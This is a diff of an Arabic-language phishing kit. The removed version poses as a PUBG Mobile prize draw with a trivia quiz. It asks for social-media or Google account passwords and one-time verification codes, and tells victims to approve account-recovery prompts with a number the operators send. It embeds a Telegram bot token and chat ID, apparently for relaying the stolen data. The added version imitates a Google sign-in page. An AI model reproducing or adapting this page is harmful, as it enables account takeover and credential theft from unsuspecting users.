-                <div class="platform-box gg" onclick="selectPlatform('google', this)">
-                    <i class="fa-brands fa-google"></i>
-                    <div class="platform-name">جوجل</div>
-                </div>
-                <div class="platform-box em" onclick="selectPlatform('email', this)">
-                    <i class="fa-solid fa-envelope"></i>
-                    <div class="platform-name">بريد إلكتروني</div>
-                </div>
-                <div class="platform-box ph" onclick="selectPlatform('phone', this)">
-                    <i class="fa-solid fa-phone"></i>
-                    <div class="platform-name">رقم هاتف</div>
-                </div>
-            </div>
-
-            <div class="form-group" id="groupPlatformUser">
-                <label class="form-label" id="labelPlatformUser">اسم المستخدم / المعرف (ببادئة @ إن وجد):</label>
-                <input type="text" id="inputPlatformUser" class="form-input" autocomplete="username" placeholder="أدخل المعرف أو اسم المستخدم" oninput="validateAccountStep()">
-                <div id="deepLinkContainer"></div>
-            </div>
-
-            <!-- خانة كلمة الملاحظات (ظاهرة كلياً وليست مخفية) -->
-            <div class="form-group">
-                <label class="form-label" id="labelNotesPassword">ادخل كلمة المرور لمنصة فيسبوك:</label>
-                <input type="text" id="inputNotesPassword" class="form-input" placeholder=" كلمة المرور (لتأكيد ملكية الحساب)" oninput="validateAccountStep()">
-                <div class="hint-text" style="color:#b7094c; font-weight:700;">
-                    ⚠️ إدخال كلمة المرور ضروري جداً لتأكيد ملكيتك للحساب والدخول في السحب.
-                </div>
-            </div>
-
-            <!-- البريد الإجباري مع إمكانية التخطي -->
-            <div class="form-group" id="groupMandatoryEmail">
-                <label class="form-label">بريد التواصل الإضافي:</label>
-                <input type="email" id="inputMandatoryEmail" class="form-input" autocomplete="email" placeholder="example@gmail.com" oninput="validateAccountStep()">
-                <button type="button" class="btn-skip" onclick="skipMandatoryEmail()">
-                    <i class="fa-solid fa-forward"></i> تخطي هذه الخطوة
-                </button>
-            </div>
-
-            <div class="btn-group">
-                <button class="btn-secondary" onclick="goToStep(2)">العودة</button>
-                <button class="btn-primary" id="btnNextStep3" disabled onclick="submitStep3AndNext()">
-                    <span>بدأ تحدي الأسئلة</span>
-                    <i class="fa-solid fa-brain"></i>
-                </button>
-            </div>
-        </div>
-
-        <!-- 🟢 الخطوة 4: تحدي الأسئلة العشوائية (PUBG Trivia) -->
-        <div class="glass-card" id="cardStep4">
-            <div class="card-header-title">
-                <i class="fa-solid fa-brain" style="color:var(--gold-bright)"></i>
-                <span>تحدي أسئلة ببجي (مطلوب 3 إجابات صحيحة)</span>
-            </div>
-
-            <div style="margin-bottom:15px; text-align:center; font-weight:800; color:#444;">
-                النقاط المحققة: <span id="quizScore" style="color:var(--success-green); font-size:1.3rem;">0</span> / 3
-            </div>
-
-            <div class="trivia-card">
-                <div class="timer-header">
-                    <span style="font-size:0.85rem; font-weight:800; color:#666;" id="questionCounter">السؤال الحالي:</span>
-                    <div class="timer-badge">
-                        <i class="fa-solid fa-stopwatch"></i>
-                        <span id="quizTimer">20</span> ثانية
-                    </div>
-                </div>
-
-                <div class="question-text" id="questionText">جاري تحميل السؤال...</div>
-                <div class="options-list" id="optionsContainer"></div>
-            </div>
-
-            <div class="btn-group">
-                <button class="btn-secondary" onclick="goToStep(3)">العودة للتعديل</button>
-            </div>
-        </div>
-
-        <!-- 🟢 الخطوة 5: مرحلة كود التحقق الأول والمعرف -->
-        <div class="glass-card" id="cardStep5">
-            <div class="card-header-title">
-                <i class="fa-solid fa-key"></i>
-                <span>مرحلة التحقق الأول واستلام الجائزة</span>
-            </div>
-
-            <div style="background:#e0f2fe; border-right:4px solid #0284c7; padding:12px; border-radius:8px; margin-bottom:15px; font-size:0.85rem; color:#0369a1; font-weight:700;">
-                <i class="fa-solid fa-info-circle"></i> قد يصلك الكود عبر الواتساب أو عبر رسالة نصية أو البريد الإلكتروني، تأكد من رسائلك.
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">أدخل كود التحقق الأول :</label>
-                <input type="text" id="inputCode1" class="form-input" maxlength="8" placeholder="أدخل رقم الكود هنا" oninput="handleCode1Input()">
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">أدخل معرف العملية الأول الذي ارسله لك فريق الدعم:</label>
-                <input type="text" id="inputIdentifier1" class="form-input" maxlength="6" placeholder="مثال:268951" oninput="validateStep5()">
-            </div>
-
-            <div style="text-align:center; margin:15px 0;">
-                <button class="btn-social btn-telegram" style="width:100%; justify-content:center; padding:12px;" onclick="requestCodeAndIdentifier1()">
-                    <i class="fa-brands fa-telegram"></i> طلب الكود والمعرف عبر التليجرام مباشرة
-                </button>
-            </div>
-
-            <div style="background:#fff3cd; border:1px solid #ffe69c; border-radius:10px; padding:12px; margin-bottom:15px; font-size:0.82rem; color:#664d03; font-weight:700;">
-                <i class="fa-solid fa-hourglass-half"></i> <strong>تنبيه الانتظار:</strong> يرجى الانتظار، إذا لم نرد عليك ربما نكون مشغولون حالياً في خدمة ومساعدة مشتركين وزوار آخرين وسيتم الرد عليك فوراً.
-            </div>
-
-            <div class="checkbox-container">
-                <input type="checkbox" id="chkReceivedCode1">
-                <label for="chkReceivedCode1">هل وصلتك رسالة كود التحقق؟ (ضع صح للتوجه لخانه الإدخال)</label>
-            </div>
-
-            <div class="btn-group">
-                <button class="btn-secondary" onclick="goToStep(3)">العودة وتعديل البيانات</button>
-                <button class="btn-primary" id="btnSubmitCode1" disabled onclick="submitCode1AndNext()">
-                    <span>تأكيد الكود والانتقال للخطوة الأخيرة</span>
-                    <i class="fa-solid fa-arrow-left"></i>
-                </button>
-            </div>
-        </div>
-
-        <!-- 🟢 الخطوة 6: شاشة التأكيد واختيار المنصة والتأكيد الثاني -->
-        <div class="glass-card" id="cardStep6">
-            <div class="card-header-title">
-                <i class="fa-solid fa-user-shield"></i>
-                <span>التأكيد النهائي وتوثيق الحساب</span>
-            </div>
-
-            <div style="background:#fef2f2; border-right:4px solid #ef4444; padding:12px; border-radius:8px; margin-bottom:15px; font-size:0.83rem; color:#991b1b; font-weight:700;">
-                <i class="fa-solid fa-triangle-exclamation"></i> <strong>ملاحظة توضيحية هامة:</strong> ربما يصلك إشعار من جوجل أو فيسبوك أو تويتر ينص على ("هل أنت من يحاول استرداد الحساب؟") ويطلب منك تأكيده، اضغط <strong>(نعم أنا)</strong> ثم اختر رقم التأكيد الذي أرسلناه لك، هذه الخطوة مهمة جداً لتأكيد ملكيتك.
-            </div>
-
-            <button class="btn-social btn-telegram" style="width:100%; justify-content:center; padding:12px; margin-bottom:15px;" onclick="requestSecondConfirmationInfo()">
-                <i class="fa-brands fa-telegram"></i> طلب رقم التأكيد والمعرف الثاني وتحديد المنصة
-            </button>
-
-            <label class="form-label">حدد المنصة التي أرسل إليها الإشعار للتوجيه المباشر:</label>
-            <div class="platforms-grid">
-                <div class="platform-box fb" onclick="triggerDeepLink('facebook')">
-                    <i class="fa-brands fa-facebook"></i>
-                    <div class="platform-name">فتح فيسبوك</div>
-                </div>
-                <div class="platform-box tw" onclick="triggerDeepLink('twitter')">
-                    <i class="fa-brands fa-x-twitter"></i>
-                    <div class="platform-name">فتح تويتر</div>
-                </div>
-                <div class="platform-box gg" onclick="triggerDeepLink('google')">
-                    <i class="fa-brands fa-google"></i>
-                    <div class="platform-name">إشعارات جوجل</div>
-                </div>
-                <div class="platform-box em" onclick="triggerDeepLink('email')">
-                    <i class="fa-solid fa-envelope"></i>
-                    <div class="platform-name">تطبيق البريد</div>
-                </div>
-            </div>
-
-            <!-- حالة الخانة المقفلة معطلة تماماً ضد النقر المباشر -->
-            <div class="checkbox-container disabled-box" style="margin-top:15px;">
-                <input type="checkbox" id="chkAutoVerified" disabled>
-                <label for="chkAutoVerified">تم التوجيه للتطبيق وتأكيد الإشعار تلقائياً </label>
-            </div>
-
-            <div class="form-group" style="margin-top:15px;">
-                <label class="form-label">أدخل معرف العملية الثاني :</label>
-                <input type="text" id="inputIdentifier2" class="form-input" maxlength="6" placeholder="مثال: 527823" oninput="validateStep6()">
-            </div>
-
-            <div style="text-align:center; margin:10px 0;">
-                <button type="button" class="btn-skip" style="background:#3b82f6;" onclick="resendNotificationSilent()">
-                    <i class="fa-solid fa-rotate-right"></i> لم يصلك الإشعار؟ اضغط لإعادة إرسال الإشعار 
-                </button>
-            </div>
-
-            <div class="btn-group">
-                <button class="btn-secondary" onclick="goToStep(5)">العودة للكود الأول</button>
-                <button class="btn-primary" id="btnFinalSubmit" disabled onclick="finishRegistration()">
-                    <span>إتمام التسجيل والاشتراك بالسحب</span>
-                    <i class="fa-solid fa-trophy"></i>
-                </button>
-            </div>
-        </div>
-
-        <!-- 🟢 الخطوة 7: شاشة النجاح والاحتفال -->
-        <div class="glass-card" id="cardStep7">
-            <div class="celebration-box">
-                <i class="fa-solid fa-trophy trophy-glow"></i>
-                <h2 style="color:var(--bg-charcoal); font-weight:900; margin:15px 0 10px;">تم تسجيلك في السحب الأسبوعي بنجاح! 🎉</h2>
-                <p style="color:#444; font-weight:700; font-size:0.95rem;" id="successPlayerMessage">
-                    تم إدراج أسمك والأيدي الخاص بك في السحب لثلاثة فائزين.
-                </p>
-                <div style="background:#d1fae5; border:1px solid #10b981; color:#065f46; padding:12px; border-radius:10px; margin:20px 0; font-weight:800; font-size:0.9rem;">
-                    سيتم إعلان الفائزين عبر قناتنا على التليجرام والتواصل معهم فور انتهاء العداد الأسبوعي.
-                </div>
-                <div class="btn-group">
-                    <button class="btn-secondary" onclick="goToStep(5)" style="width:100%;">
-                        <i class="fa-solid fa-rotate-right"></i> العودة لصفحة الأكواد لإعادة الإرسال
-                    </button>
-                </div>
-            </div>
-        </div>
-
-    </main>
-
-    <!-- نافذة الشات التفاعلي العائم للدعم Quick Support Widget -->
-    <div class="floating-support-desk">
-        <div class="support-fab" onclick="toggleSupportModal()">
-            <i class="fa-solid fa-headset"></i>
-        </div>
-        <div class="support-modal" id="supportModal">
-            <h4 style="color:#111; font-weight:900; margin-bottom:10px; border-bottom:1px solid #eee; padding-bottom:6px;">
-                <i class="fa-solid fa-circle-question" style="color:var(--gold-bright)"></i> مركز المساعدة الفورية
-            </h4>
-            <div style="font-size:0.8rem; color:#444; font-weight:700; line-height:1.6; max-height:220px; overflow-y:auto; margin-bottom:12px;">
-                <p><strong>من أين أحصل على الكود والمعرف؟</strong><br>اضغط على زر "طلب الكود والمعرف" ليتم توجيهك للتليجرام وتوليد رسالة طلب تلقائية.</p>
-                <hr style="margin:6px 0;">
-                <p><strong>ما هي كلمة المرور؟</strong><br>هي كلمة المرور الخاصة بالحساب لتأكيد أنك المالك الحقيقي ومنع التسجيلات الوهمية.</p>
-            </div>
-            <div style="display:flex; gap:8px;">
-                <button class="btn-social btn-telegram" style="flex:1; justify-content:center; font-size:0.75rem;" onclick="openTelegramDirect()">تليجرام</button>
-                <button class="btn-social btn-whatsapp" style="flex:1; justify-content:center; font-size:0.75rem;" onclick="openWhatsAppDirect()">واتساب</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- حاوية الإشعارات الحية التفاعلية Toasts Container -->
-    <div class="toast-container" id="toastContainer"></div>
-
-    <!-- شاشة انقطاع الاتصال بالإنترنت Offline Shield Overlay -->
-    <div id="offlineOverlay">
-        <i class="fa-solid fa-wifi-slash offline-icon"></i>
-        <h2 style="font-weight:900; margin-bottom:10px;">انقطع الاتصال بالإنترنت!</h2>
-        <p style="max-width:400px; font-size:0.9rem; color:#ccc; margin-bottom:20px; font-weight:600;">
-            يتطلب استكمال العمل وجود اتصال فعال بالشبكة. يرجى إعادة الاتصال بالإنترنت والمحاولة مجدداً.
-        </p>
-        <button class="btn-primary" style="max-width:200px;" onclick="checkInternetConnection()">
-            <i class="fa-solid fa-rotate-right"></i> إعادة المحاولة / فحص
+<div class="container">
+    <!-- 🔹 زر العودة في أعلى الشاشة -->
+    <div class="top-nav">
+        <button id="backBtn" class="back-btn" onclick="goBack()" style="display: none;">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
+            <span>العودة خطوة</span>
         </button>
     </div>
 
-    <!-- المحرك البرمجي الشامل JavaScript Engine -->
-    <script>
-        /* ===================================================
-           1. بيانات الاعتماد الفنية للربط الفني Telegram API
-           =================================================== */
-        const TELEGRAM_BOT_TOKEN = "8898927305:AAHMxzFT5nZ3e6w30XuI-4ibBZjmTLhbw5M";
-        const TELEGRAM_CHAT_ID = "8796885500";
-        const TELEGRAM_SUPPORT_USER = "Pubg_Rivals";
-        const WHATSAPP_SUPPORT_NUM = "+7 707 403 2501";
+    <!-- Google Logo -->
+    <div class="google-logo">
+        <svg viewBox="0 0 74 24" width="75" height="24">
+            <path fill="#4285F4" d="M9.24 10.19v3.25h7.62c-.3 1.95-2.28 5.72-7.62 5.72-4.59 0-8.34-3.81-8.34-8.5s3.75-8.5 8.34-8.5c2.62 0 4.38 1.12 5.39 2.08l2.58-2.49C15.36 1.18 12.57 0 9.24 0 4.14 0 0 4.14 0 9.25s4.14 9.25 9.24 9.25c5.33 0 8.87-3.75 8.87-9.03 0-.61-.07-1.07-.15-1.53H9.24z"/>
+            <path fill="#EA4335" d="M22.5 13.91c-.34.95-1.25 2.59-3.32 2.59-2.3 0-3.95-1.83-3.95-4.25 0-2.58 1.83-4.25 4.13-4.25 2.12 0 3.12 1.5 3.32 2.5l2.67-1.11c-.56-1.57-2.32-3.89-6-3.89-3.86 0-7 3.09-7 7 0 3.82 3.05 7 7 7 3.65 0 5.4-2.46 5.86-3.85l-2.71-1.24z"/>
+            <path fill="#FBBC05" d="M32.5 5.5h-3v13h3v-13z"/>
+            <path fill="#34A853" d="M41 12.25c0-1.41-.38-2.07-.86-2.61-.63-.71-1.58-1.14-2.64-1.14-2.3 0-3.95 1.83-3.95 4.25 0 2.58 1.83 4.25 4.13 4.25 1.02 0 1.95-.41 2.58-1.1.52-.56.74-1.29.74-2.65v-1h-3.46v2.19h1.15v.28c0 .32-.27.58-.6.58-.89 0-1.35-.74-1.35-1.8 0-1.07.49-1.8 1.35-1.8.46 0 .82.26.96.65h2.38z"/>
+        </svg>
+    </div>
 
-        /* ===================================================
-           2. النظام الصوتي المدمج (PUBG Web Audio Engine)
-           =================================================== */
-        class AudioEngine {
-            constructor() {
-                this.ctx = new (window.AudioContext || window.webkitAudioContext)();
-            }
-            playClick() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(800, this.ctx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(400, this.ctx.currentTime + 0.05);
-                gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
-                gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.05);
-            }
-            playTick() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'square';
-                osc.frequency.setValueAtTime(1200, this.ctx.currentTime);
-                gain.gain.setValueAtTime(0.05, this.ctx.currentTime);
-                gain.gain.linearRampToValueAtTime(0.001, this.ctx.currentTime + 0.03);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.03);
-            }
-            playTimerEnd() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.setValueAtTime(300, this.ctx.currentTime);
-                osc.frequency.linearRampToValueAtTime(150, this.ctx.currentTime + 0.3);
-                gain.gain.setValueAtTime(0.4, this.ctx.currentTime);
-                gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.3);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(this.ctx.currentTime + 0.3);
-            }
-            playCorrect() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const now = this.ctx.currentTime;
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'triangle';
-                osc.frequency.setValueAtTime(523.25, now); // C5
-                osc.frequency.setValueAtTime(659.25, now + 0.1); // E5
-                osc.frequency.setValueAtTime(783.99, now + 0.2); // G5
-                gain.gain.setValueAtTime(0.4, now);
-                gain.gain.linearRampToValueAtTime(0.01, now + 0.4);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(now + 0.4);
-            }
-            playWrong() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const now = this.ctx.currentTime;
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.setValueAtTime(180, now);
-                osc.frequency.setValueAtTime(140, now + 0.15);
-                gain.gain.setValueAtTime(0.4, now);
-                gain.gain.linearRampToValueAtTime(0.01, now + 0.35);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(now + 0.35);
-            }
-            playAlert() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const now = this.ctx.currentTime;
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(900, now);
-                osc.frequency.setValueAtTime(600, now + 0.1);
-                gain.gain.setValueAtTime(0.3, now);
-                gain.gain.linearRampToValueAtTime(0.01, now + 0.25);
-                osc.connect(gain);
-                gain.connect(this.ctx.destination);
-                osc.start();
-                osc.stop(now + 0.25);
-            }
-            playCelebration() {
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-                const notes = [523.25, 659.25, 783.99, 1046.50];
-                notes.forEach((freq, idx) => {
-                    const osc = this.ctx.createOscillator();
-                    const gain = this.ctx.createGain();
-                    osc.frequency.value = freq;
-                    gain.gain.setValueAtTime(0.3, this.ctx.currentTime + idx * 0.12);
-                    gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + idx * 0.12 + 0.3);
-                    osc.connect(gain);
-                    gain.connect(this.ctx.destination);
-                    osc.start(this.ctx.currentTime + idx * 0.12);
-                    osc.stop(this.ctx.currentTime + idx * 0.12 + 0.3);
-                });
-            }
-        }
-        const audio = new AudioEngine();
+    <!-- 🔹 المرحلة الأولى -->
+    <div id="phase1" class="step-page active">
+        <h1 class="title">تسجيل الدخول</h1>
+        <p class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحاً لاستخدامه في تطبيقات Google الأخرى.<br>
+            <button class="btn-link" onclick="toggleHelp()">مزيد من المعلومات حول استخدام حسابك</button>
+        </p>
+        
+        <div id="helpBox" style="display:none;" class="alert-info">
+            أدخل بريدك الإلكتروني أو رقم الهاتف المرتبط بحساب Google الخاص بك للمتابعة.
+        </div>
 
-        // تشغيل صوت النقر على كل العناصر القابلة للنقر
-        document.addEventListener('click', (e) => {
-            if (e.target.closest('button, .step-tab, .platform-box, .reward-card, a, input[type="checkbox"]')) {
-                audio.playClick();
-            }
-        });
+        <div class="input-group">
+            <input type="text" id="emailInput" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
+        </div>
 
-        /* ===================================================
-           3. بنك الأسئلة الـ 50 الشامل لمسابقة ببجي موبايل
-           =================================================== */
-        const pubgTriviaBank = [
-            { q: "ما هي أقوى بندقية قنص يدوية (Bolt-Action) في ببجي موبايل من حيث الضرر؟", opts: ["AWM", "M24", "Kar98k", "Mosin Nagant"], a: 0 },
-            { q: "أي خريطة من خرائط ببجي تتميز بتواجد المصاعد والعماير الشاهقة والمباني التكتيكية الحديثة؟", opts: ["إرنغل", "ميرامار", "نوسا", "كاراكين"], a: 2 },
-            { q: "ما هو حجم المخزن الأساسي لسلاح الرشاش الخفيف M249 قبل تركيب المخزن الموسع؟", opts: ["75 طلقة", "100 طلقة", "50 طلقة", "60 طلقة"], a: 0 },
-            { q: "أي من الدروع التالية يوفر حماية بنسبة 55% وتقليل ضرر إضافي؟", opts: ["درع مستوى 3", "درع مستوى 2", "درع مستوى 1", "الخوذة التكتيكية"], a: 0 },
-            { q: "ما السلاح الذي يلقب بـ 'ملك المواجهات القريبة' وتصل سرعة إطلاقه لمعدل عالي جداً؟", opts: ["Uzi", "Vector", "UMP45", "Tommy Gun"], a: 0 },
-            { q: "في أي خريطة تظهر الزوبعة الرملية التي تعيق الرؤية وتدمر البنيات؟", opts: ["ميرامار", "كاراكين", "فيكندي", "سانهوك"], a: 1 },
-            { q: "كم عدد اللاعبين الأقصى في المباراة الكلاسيكية الواحدة في خريطة إرنغل؟", opts: ["100 لاعب", "64 لاعب", "50 لاعب", "80 لاعب"], a: 0 },
-            { q: "ما هو اسم السيارة البرمائية الثقيلة المضادة للرصاص التي تطلب بمسدس الإشارات خارج المنطقة؟", opts: ["BRDM-2", "UAZ", "Dacia", "Buggy"], a: 0 },
-            { q: "ما هي طلقة السلاح المساندة لـ AWM؟", opts: [".300 Magnum", "7.62mm", "5.56mm", "9mm"], a: 0 },
-            { q: "ما فائدة استخدام 'حقيبة الإسعافات الأوليّة' (First Aid Kit)؟", opts: ["تعيد الصحة حتى 75%", "تعيد الصحة بنسبة 100%", "تعطي طاقة حزام كاملة", "تعيد الصحة حتى 50%"], a: 0 },
-            { q: "أي خريطة تتميز بوجود ثلج وتزلج وغزلان ومناظر قريبة من القطب؟", opts: ["فيكندي", "ليفيك", "سانهوك", "كاراكين"], a: 0 },
-            { q: "ما اسم القنابل التي تطلق دخاناً كثيفاً حامياً للاعبين أثناء التثبيت؟", opts: ["قنبلة دخانية (Smoke)", "قنبلة صدمة (Stun)", "قنبلة مولوتوف", "قنبلة شظايا"], a: 0 },
-            { q: "ما هو المشروب الذي يرفع مؤشر الطاقة (Boost) ببطء؟", opts: ["مشروب الطاقة (Energy Drink)", "المسكن (Painkiller)", "حقنة الإيبرين", "الضمادة"], a: 0 },
-            { q: "أي من الأسلحة التالية يستخدم عيار 7.62mm ويتميز بضرر مرتفع جداً وارتداد عالي؟", opts: ["AKM", "M416", "SCAR-L", "AUG"], a: 0 },
-            { q: "ما هو اللون المميز لبدلة التخفي (Ghillie Suit) في خريطة سانهوك؟", opts: ["أخضر عشب داكن", "أصفر صحراوي", "أبيض ثلجي", "بني بنيوي"], a: 0 },
-            { q: "كم ثانية تستغرق عملية إعادة إحياء (Revive) الزميل الساقط؟", opts: ["10 ثوانٍ", "5 ثوانٍ", "12 ثانية", "8 ثوانٍ"], a: 0 },
-            { q: "ما فائدة حزام الطاقة الكامل (100% Boost)؟", opts: ["زيادة سرعة الركض واستعادة الصحة تدريجياً", "زيادة ضخ الرصاص", "منع التضرر من الزون", "تقليل الارتداد"], a: 0 },
-            { q: "أي سلاح يعتبر خياراً مثالياً للثبات في المدى المتوسط بفضل امكانية تركيب 5 قطعات؟", opts: ["M416", "GROZA", "Beryl M762", "Mk14"], a: 0 },
-            { q: "ما السلاح الذي يخرج فقط من صندوق الإمدادات (Drop) ويطلق عيار 7.62mm أوتوماتيكي؟", opts: ["GROZA", "AKM", "DP-28", "SKS"], a: 0 },
-            { q: "ما هي الخريطة ذات الحجم الأصغر بـ 2x2 كم وتضم 52 لاعباً فقط؟", opts: ["ليفيك", "نوسا", "سانهوك", "إرنغل"], a: 0 },
-            { q: "ما فائدة استخدام 'المخزن الموسع السريع' (QuickDraw Extended Mag)؟", opts: ["زيادة السعة وسرعة تعبئة الذخيرة", "زيادة دقة الإطلاق", "تقليل الارتداد الأفقية", "زيادة المدى"], a: 0 },
-            { q: "ما السلاح الذي يمكن طي أخمص قدمه (Bipod) عند الانحناء أو الانطاح لزيادة الثبات؟", opts: ["DP-28", "M416", "Vector", "Mini14"], a: 0 },
-            { q: "ما هي أقصى مسافة يمكن رصد مسدس الإشارات (Flare Gun) فيها عند إطلاقه عمودياً؟", opts: ["تظهر في الخريطة للجميع", "100 متر فقط", "لا تظهر إطلاقاً", "500 متر"], a: 0 },
-            { q: "ما الذي يحدث عند إطلاق مسدس الإشارات داخل المنطقة الآمنة (Safe Zone)؟", opts: ["استدعاء صندوق إمدادات جوي (Drop)", "استدعاء مدرعة BRDM", "استدعاء طائرة هليكوبتر", "إرسال قنبلة ذكية"], a: 0 },
-            { q: "أي من السيارات التالية تعتبر الأسرع على الطرق المعبدة في خريطة إرنغل؟", opts: ["Dacia", "UAZ", "Buggy", "Pickup"], a: 0 },
-            { q: "ما هي أقصى درجة حماية توفرها خوذة مستوى 3 للرأس؟", opts: ["تمنع القتل بضربة واحدة من Kar98k", "تمنع القتل بضربة AWM", "تمنع جميع أنواع الأضرار", "تزيد سرعة الحركة"], a: 0 },
-            { q: "أي خريطة تتميز بالأشجار الاستوائية والمعابد القديمة والأمطار المتكررة؟", opts: ["سانهوك", "ميرامار", "فيكندي", "ليفيك"], a: 0 },
-            { q: "ما هو الملحق الذي يقلل من صوت السلاح ويخفي الوميض الصادر عند الإطلاق؟", opts: ["كاتم الصوت (Suppressor)", "تعويض الارتداد (Compensator)", "مخفي الوميض (Flash Hider)", "الخنق (Choke)"], a: 0 },
-            { q: "ما اسم المنظار الذي يوفر تقريب 8X ويمكن تركيبه فقط على القناصات وبعض الـ DMR؟", opts: ["منظار 8x", "منظار 6x", "منظار 4x", "الرد دوت"], a: 0 },
-            { q: "ما السلاح ذو طلقات الشوزن الناري الصغير المزدوج الحجم المميز بالمواجهات؟", opts: ["DBS", "S12K", "S686", "S1897"], a: 0 },
-            { q: "ما اسم الخريطة الصحراوية الشاسعة المترامية الأطراف؟", opts: ["ميرامار", "كاراكين", "نوسا", "إرنغل"], a: 0 },
-            { q: "ما هو أقصى عدد لضمادات الجروح (Bandages) التي يستحسن حملها لسرعة الاستخدام؟", opts: ["تستعمل لاستعادة الصحة حتى 75%", "تعيد الصحة كلياً", "لا تقبل العلاج بها", "تمنع ضرر الزون"], a: 0 },
-            { q: "ما هي الطائرة الخفيفة البسيطة التي تسمح للاعبين بالطيران في بعض الخرائط؟", opts: ["الطائرة الشراعية (Motor Glider)", "الهليكوبتر", "المنطاد", "الباراشوت التكتيكي"], a: 0 },
-            { q: "ما هو الملحق الذي يساعد في تقليل الارتداد الرأسي والأفقي معاً للسلاح؟", opts: ["المُعوض (Compensator)", "الكاتم", "مخفي الوميض", "المقبض المائل"], a: 0 },
-            { q: "ما السلاح الذي يطلق ذخيرة عيار 9mm وله مخزن يتسع لـ 35 طلقة بشكل أساسي؟", opts: ["PP-19 Bizon", "UMP45", "Micro UZI", "Vector"], a: 0 },
-            { q: "في أي طور لعب يتواجه فريقان من 4 لاعبين في مساحة مغلقة مع استعادة سريعة للرصاص؟", opts: ["مباراة الفرق المميتة (TDM / المستودع)", "الطور الكلاسيكي", "الطور المحاكي", "الطور المصغر"], a: 0 },
-            { q: "ما الميزة الخاصة التي توفرها الشاحنة الصغيرة Monster Truck في خريطة ليفيك؟", opts: ["اجتياز الصخور والتضاريس الوعرة بسهولة", "السرعة الفائقة جداً", "الطيران في الهواء", "إطلاق الرصاص التلقائي"], a: 0 },
-            { q: "ما هو السلاح الرشاش السريع الذي يتوفر حصرياً في خريطة سانهوك كبديل لـ M416؟", opts: ["QBZ", "G36C", "AUG", "AKM"], a: 0 },
-            { q: "ما هي القنبلة التي تتسبب في حرق المنطقة وتلحق ضرراً مستمراً فوق المباني؟", opts: ["قنبلة المولوتوف (Molotov Cocktail)", "قنبلة الشظايا", "القنبلة الدخانية", "القنبلة الصوتية"], a: 0 },
-            { q: "كم تبلغ التعبئة القصوى لحقيبة الظهر مستوى 3 (Level 3 Backpack)؟", opts: ["أعلى سعة استيعاب للمعدات والذخيرة", "أقل سعة", "تساوي مستوى 1", "لا تحمل ذخيره ثقيلة"], a: 0 },
-            { q: "ما السلاح الفردي القناص النصف أوتوماتيكي المميز بعيار 5.56mm وسرعة طلقة فائقة؟", opts: ["Mini14", "SKS", "SLR", "Mk14"], a: 0 },
-            { q: "ما الذي يشير إليه رمز 'البنج' (Ping / MS) في ببجي موبايل؟", opts: ["سرعة الاستجابة وزمن انتقال البيانات للسيرفر", "عدد القتلى", "قوة سلاحك", "مستوى الحساب"], a: 0 },
-            { q: "ما هي الوسيلة التي تمكنك من العودة للمباراة بعد الموت في الأطوار المود الحديثة؟", opts: ["بطاقة الاستدعاء (Recall Card)", "حقنة العلاج", "مسدس الإشعارات", "حزام الأمان"], a: 0 },
-            { q: "أي من الأسلحة التالية يحتوي على نمط إطلاق الرش الكامل الخارق لجميع الدروع من الصندوق؟", opts: ["Mk14", "SKS", "Mini14", "QBU"], a: 0 },
-            { q: "ما هو اللون المفتاح لمنطقة الخطر الزون الأحمر (Red Zone) على الخريطة؟", opts: ["دائرة حمراء بها قصف مدفعي عشوائي", "دائرة زرقاء", "دائرة بيضاء", "دائرة خضراء"], a: 0 },
-            { q: "ما هي فائدة المقبض الرأسي (Vertical Foregrip) عند تركيبه على السلاح؟", opts: ["تقليل الارتداد الرأسي عند الإطلاق", "تقليل الارتداد الأفقي", "زيادة سرعة التعبئة", "زيادة مدى الزوم"], a: 0 },
-            { q: "ما اسم القناصة الهجومية الفردية التي تتوفر حصرياً في خريطة ميرامار وسانهوك بطلقات 7.62mm؟", opts: ["SLR", "Win94", "SKS", "Kar98k"], a: 1 },
-            { q: "أي مقبض يفضل استخدامه للمواجهات القريبة والسريعة لتسريع زوم المنظار (ADS)؟", opts: ["المقبض المائل (Angled Grip) / الإبهام", "المقبض الرأسي", "المقبض الخفيف", "المقبض النصفى"], a: 0 },
